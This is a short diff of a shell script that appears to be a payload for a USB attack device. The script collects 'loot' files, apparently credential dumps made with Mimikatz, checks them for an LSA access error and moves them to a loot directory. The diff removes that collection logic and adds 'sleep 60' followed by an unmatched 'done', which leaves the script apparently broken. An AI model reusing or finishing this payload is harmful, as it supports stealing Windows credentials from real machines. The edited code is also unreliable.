@@ -67,21 +67,5 @@ python $SWITCHDIR/server.py
 
 #Wait for EOF in loot folder
 LED SPECIAL2
-while [ ! -e  "$SWITCHDIR/loot/EOF" ]; do sleep 1; done;
-sleep 1
-
-# check for empty lootddd directory, then check results and move them to loot
-if [ "$(ls -A $SWITCHDIR/loot/)" ]; then
-    if grep -q "ERROR kuhl_m_sekurlsa_acquireLSA" $SWITCHDIR/loot/*.txt; then
-       LED FAIL
-       mv -v $SWITCHDIR/loot/*.txt $LOOTDIR
-       rm -rf $SWITCHDIR/loot/
-    else
-       mv -v $SWITCHDIR/loot/*.txt $LOOTDIR
-       rm -rf $SWITCHDIR/loot/
-       LED FINISH
-    fi
-else
-     rm -rf $SWITCHDIR/loot/
-     LED FAIL
-fi
+sleep 60
+done
